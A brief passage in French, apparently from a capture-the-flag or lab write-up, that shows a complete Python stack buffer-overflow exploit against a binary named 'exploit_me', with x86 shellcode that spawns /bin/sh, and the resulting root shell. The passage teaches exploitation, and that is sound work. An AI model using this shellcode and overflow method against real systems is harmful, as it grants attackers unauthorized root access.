### SSH (zaz)

Toujours grace a un buffer overflow, il possible egalement de passer un shellcode, qui
sera execute au lancement du programme.

```python
#!/usr/bin/env python

from __future__ import print_function
import struct

# fill the buffer
pad = b"\x90" * 140

# overflow to change the eip pointer to be somewhere in the buffer's address
eip = struct.pack("I", 0xbffff6c0 + 200)

# fill the buffer with nop to be sure
nop = b"\x90" * 1000

# setuid, setgid, reopens stdin, and run /bin/sh
shellcode = b"\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

to_print = pad + eip + nop + shellcode

print(to_print, end = '')
```

Une fois connecte en ssh a l'user `zaz`:

```console
$ ./exploit_me $(python shellcode.py)
# id
uid=0(root) gid=0(root) groups=0(root),1005(zaz)
```

